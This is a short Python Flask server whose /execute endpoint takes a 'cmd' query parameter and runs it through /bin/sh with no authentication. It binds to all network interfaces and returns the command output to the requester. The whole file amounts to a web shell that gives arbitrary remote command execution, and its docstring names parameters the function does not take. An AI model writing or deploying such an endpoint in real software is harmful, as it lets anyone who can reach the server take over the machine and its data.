import logging
import subprocess
import sys

from flask import Flask, request

logger = logging.getLogger(__name__)
app = Flask(__name__)
@app.route('/')
def index():
    return 'Server Works!'

def exec_cmd(cmd):
    """
    execute command
    :param cmd: str|list
    :param get_all_result:
    :param raise_error:
    :return: standard output if return code is 0, otherwise raise RuntimeError
    """
    try:
        result = subprocess.check_output(["/bin/sh", "-c", cmd], stderr=subprocess.STDOUT).decode("utf8")
        return result
    except OSError as e:
        print("Execution failed:", e, file=sys.stderr)
    except Exception as ge:
        print("Execution failed:", ge, file=sys.stderr)
    return 0

@app.route('/execute', methods=["get", "post"])
def execution():
    cmd = request.args["cmd"]
    res = exec_cmd(cmd)
    return str(res)


app.run(host="0.0.0.0")

